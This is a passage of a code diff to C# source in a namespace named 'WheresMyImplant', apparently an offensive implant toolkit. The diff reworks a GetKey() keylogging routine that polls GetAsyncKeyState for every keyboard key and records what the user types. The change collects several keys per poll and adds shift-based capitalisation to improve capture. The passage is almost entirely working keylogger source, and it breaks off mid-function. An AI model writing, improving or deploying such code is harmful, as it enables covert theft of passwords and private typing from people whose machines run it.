@@ -64,397 +64,398 @@ namespace WheresMyImplant
 
         private static String GetKey()
         {
+            String returnVal = "";
+            Boolean shift = false;
             //Get Missing Cases
             if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KeyCode))
-                return "\n[:KeyCode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Modifiers))
-                return "\n[:Modifiers:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.None))
-                return "\n[:None:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LButton))
-                return "\n[:LMouse:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RButton))
-                return "\n[:RMouse:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Cancel))
-                return "\n[:Cancel:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MButton))
-                return "\n[:MButton:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton1))
-                return "\n[:XButton1:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton2))
-                return "\n[:XButton2:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Back))
-                return "\n[:Backspace:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Tab))
-                return "\n[:Tab:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LineFeed))
-                return "\n[:LineFeed:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Clear))
-                return "\n[:Clear:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Return))
-                return "\n";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Enter))
-                return "\n";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
-                return "[:Shift:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey))
-                return "\n[:ControlKey:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Menu))
-                return "\n[:Menu:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pause))
-                return "\n[:Pause:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Capital))
-                return "\n[:Capital:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.CapsLock))
-                return "\n[:CapsLock:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanaMode))
-                return "\n[:KanaMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanguelMode))
-                return "\n[:HanguelMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HangulMode))
-                return "\n[:HangulMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.JunjaMode))
-                return "\n[:JunjaMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.FinalMode))
-                return "\n[:FinalMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanjaMode))
-                return "\n[:HanjaMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanjiMode))
-                return "\n[:KanjiMode:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Escape))
-                return "\n[:Escape:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEConvert))
-                return "\n[:IMEConvert:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMENonconvert))
-                return "\n[:IMENonconvert:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAccept))
-                return "\n[:IMEAccept:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAceept))
-                return "\n[:IMEAceept:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEModeChange))
-                return "\n[:IMEModeChange:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Space))
-                return " ";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Prior))
-                return "\n[:Prior:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageUp))
-                return "\n[:PageUp:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Next))
-                return "\n[:Next:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageDown))
-                return "\n[:PageDown:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.End))
-                return "\n[:End:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Home))
-                return "\n[:Home:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Left))
-                return "\n[:Left:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Up))
-                return "\n[:Up:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Right))
-                return "\n[:Right:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Down))
-                return "\n[:Down:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Select))
-                return "\n[:Select:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Print))
-                return "\n[:Print:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Execute))
-                return "\n[:Execute:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Snapshot))
-                return "\n[:Snapshot:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PrintScreen))
-                return "\n[:PrintScreen:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Insert))
-                return "\n[:Insert:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Delete))
-                return "\n[:Delete:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Help))
-                return "\n[:Help:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D0))
-                return "0";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D1))
-                return "1";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D2))
-                return "2";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D3))
-                return "3";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D4))
-                return "4";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D5))
-                return "5";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D6))
-                return "6";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D7))
-                return "7";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D8))
-                return "8";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D9))
-                return "9";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.A))
-                return "a";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.B))
-                return "b";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.C))
-                return "c";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D))
-                return "d";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.E))
-                return "e";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F))
-                return "f";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.G))
-                return "g";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.H))
-                return "h";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.I))
-                return "i";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.J))
-                return "j";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.K))
-                return "k";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.L))
-                return "l";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.M))
-                return "m";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.N))
-                return "n";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.O))
-                return "o";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.P))
-                return "p";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Q))
-                return "q";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.R))
-                return "r";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.S))
-                return "s";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.T))
-                return "t";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.U))
-                return "u";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.V))
-                return "v";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.W))
-                return "w";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.X))
-                return "x";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Y))
-                return "y";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Z))
-                return "z";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LWin))
-                return "\n[:LWin:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RWin))
-                return "\n[:RWin:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Apps))
-                return "\n[:Apps:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Sleep))
-                return "\n[:Sleep:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad0))
-                return "0";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad1))
-                return "1";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad2))
-                return "2";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad3))
-                return "3";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad4))
-                return "4";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad5))
-                return "5";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad6))
-                return "6";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad7))
-                return "7";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad8))
-                return "8";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad9))
-                return "9";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Multiply))
-                return "*";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Add))
-                return "+";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Separator))
-                return "\n[:Separator:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Subtract))
-                return "-";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Decimal))
-                return ".";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Divide))
-                return "/";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F1))
-                return "\n[:F1:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F2))
-                return "\n[:F2:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F3))
-                return "\n[:F3:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F4))
-                return "\n[:F4:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F5))
-                return "\n[:F5:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F6))
-                return "\n[:F6:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F7))
-                return "\n[:F7:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F8))
-                return "\n[:F8:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F9))
-                return "\n[:F9:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F10))
-                return "\n[:F10:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F11))
-                return "\n[:F11:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F12))
-                return "\n[:F12:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F13))
-                return "\n[:F13:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F14))
-                return "\n[:F14:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F15))
-                return "\n[:F15:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F16))
-                return "\n[:F16:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F17))
-                return "\n[:F17:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F18))
-                return "\n[:F18:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F19))
-                return "\n[:F19:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F20))
-                return "\n[:F20:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F21))
-                return "\n[:F21:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F22))
-                return "\n[:F22:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F23))
-                return "\n[:F23:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F24))
-                return "\n[:F24:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumLock))
-                return "\n[:NumLock:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Scroll))
-                return "\n[:Scroll:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LShiftKey))
-                return "[:UnShift:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RShiftKey))
-                return "[:UnShift:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LControlKey))
-                return "\n[:LControlKey:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RControlKey))
-                return "\n[:RControlKey:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LMenu))
-                return "\n[:LMenu:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RMenu))
-                return "\n[:RMenu:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserBack))
-                return "\n[:BrowserBack:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserForward))
-                return "\n[:BrowserForward:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserRefresh))
-                return "\n[:BrowserRefresh:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserStop))
-                return "\n[:BrowserStop:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserSearch))
-                return "\n[:BrowserSearch:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserFavorites))
-                return "\n[:BrowserFavorites:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserHome))
-                return "\n[:BrowserHome:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeMute))
-                return "\n[:VolumeMute:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeDown))
-                return "\n[:VolumeDown:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeUp))
-                return "\n[:VolumeUp:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaNextTrack))
-                return "\n[:MediaNextTrack:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPreviousTrack))
-                return "\n[:MediaPreviousTrack:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaStop))
-                return "\n[:MediaStop:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPlayPause))
-                return "\n[:MediaPlayPause:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchMail))
-                return "\n[:LaunchMail:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.SelectMedia))
-                return "\n[:SelectMedia:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication1))
-                return "\n[:LaunchApplication1:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication2))
-                return "\n[:LaunchApplication2:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemSemicolon))
-                return ";";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem1))
-                return "\n[:Oem1:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemplus))
-                return "\n[:Oemplus:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemcomma))
-                return "\n[:Oemcomma:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemMinus))
-                return "\n[:OemMinus:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPeriod))
-                return "\n[:OemPeriod:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuestion))
-                return "\n[:OemQuestion:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem2))
-                return "\n[:Oem2:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemtilde))
-                return "\n[:Oemtilde:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem3))
-                return "\n[:Oem3:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemOpenBrackets))
-                return "\n[:OemOpenBrackets:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem4))
-                return "\n[:Oem4:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPipe))
-                return "\n[:OemPipe:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem5))
-                return "\n[:Oem5:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemCloseBrackets))
-                return "\n[:OemCloseBrackets:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem6))
-                return "\n[:Oem6:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuotes))
-                return "\"";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem7))
-                return "\n[:Oem7:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem8))
-                return "\n[:Oem8:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemBackslash))
-                return "\n[:OemBackslash:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem102))
-                return "\n[:Oem102:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ProcessKey))
-                return "\n[:ProcessKey:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Packet))
-                return "\n[:Packet:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Attn))
-                return "\n[:Attn:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Crsel))
-                return "\n[:Crsel:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Exsel))
-                return "\n[:Exsel:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.EraseEof))
-                return "\n[:EraseEof:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Play))
-                return "\n[:Play:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Zoom))
-                return "\n[:Zoom:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NoName))
-                return "\n[:NoName:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pa1))
-                return "\n[:Pa1:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemClear))
-                return "\n[:OemClear:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Shift))
-                return "\n[:Shift:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Control))
-                return "\n[:Control:]";
-            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Alt))
-                return "\n[:Alt:]";
-            else
-                return "";
+                returnVal += "\n[:KeyCode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Modifiers))
+                returnVal += "\n[:Modifiers:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.None))
+                returnVal += "\n[:None:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LButton))
+                returnVal += "\n[:LMouse:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RButton))
+                returnVal += "\n[:RMouse:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Cancel))
+                returnVal += "\n[:Cancel:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MButton))
+                returnVal += "\n[:MButton:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton1))
+                returnVal += "\n[:XButton1:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton2))
+                returnVal += "\n[:XButton2:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Back))
+                returnVal += "\n[:Backspace:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Tab))
+                returnVal += "\n[:Tab:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LineFeed))
+                returnVal += "\n[:LineFeed:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Clear))
+                returnVal += "\n[:Clear:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Return))
+                returnVal += "\n";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Enter))
+                returnVal += "\n";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
+                shift = true;
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey))
+                returnVal += "\n[:ControlKey:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Menu))
+                returnVal += "\n[:Menu:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pause))
+                returnVal += "\n[:Pause:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Capital))
+                returnVal += "\n[:Capital:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.CapsLock))
+                returnVal += "\n[:CapsLock:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanaMode))
+                returnVal += "\n[:KanaMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanguelMode))
+                returnVal += "\n[:HanguelMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HangulMode))
+                returnVal += "\n[:HangulMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.JunjaMode))
+                returnVal += "\n[:JunjaMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.FinalMode))
+                returnVal += "\n[:FinalMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanjaMode))
+                returnVal += "\n[:HanjaMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanjiMode))
+                returnVal += "\n[:KanjiMode:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Escape))
+                returnVal += "\n[:Escape:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEConvert))
+                returnVal += "\n[:IMEConvert:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMENonconvert))
+                returnVal += "\n[:IMENonconvert:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAccept))
+                returnVal += "\n[:IMEAccept:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAceept))
+                returnVal += "\n[:IMEAceept:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEModeChange))
+                returnVal += "\n[:IMEModeChange:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Space))
+                returnVal += " ";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Prior))
+                returnVal += "\n[:Prior:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageUp))
+                returnVal += "\n[:PageUp:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Next))
+                returnVal += "\n[:Next:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageDown))
+                returnVal += "\n[:PageDown:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.End))
+                returnVal += "\n[:End:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Home))
+                returnVal += "\n[:Home:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Left))
+                returnVal += "\n[:Left:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Up))
+                returnVal += "\n[:Up:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Right))
+                returnVal += "\n[:Right:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Down))
+                returnVal += "\n[:Down:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Select))
+                returnVal += "\n[:Select:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Print))
+                returnVal += "\n[:Print:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Execute))
+                returnVal += "\n[:Execute:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Snapshot))
+                returnVal += "\n[:Snapshot:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PrintScreen))
+                returnVal += "\n[:PrintScreen:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Insert))
+                returnVal += "\n[:Insert:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Delete))
+                returnVal += "\n[:Delete:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Help))
+                returnVal += "\n[:Help:]";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D0))
+                returnVal += "0";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D1))
+                returnVal += "1";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D2))
+                returnVal += "2";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D3))
+                returnVal += "3";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D4))
+                returnVal += "4";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D5))
+                returnVal += "5";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D6))
+                returnVal += "6";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D7))
+                returnVal += "7";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D8))
+                returnVal += "8";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D9))
+                returnVal += "9";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.A))
+                returnVal += shift ? "A" : "a";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.B))
+                returnVal += shift ? "B" : "b";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.C))
+                returnVal += shift ? "C" : "c";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D))
+                returnVal += shift ? "D" : "d";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.E))
+                returnVal += shift ? "E" : "e";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F))
+                returnVal += shift ? "F" : "f";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.G))
+                returnVal += shift ? "G" : "g";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.H))
+                returnVal += shift ? "H" : "h";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.I))
+                returnVal += shift ? "I" : "i";
+            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.J))
+                returnVal += shift ? "J" : "j";
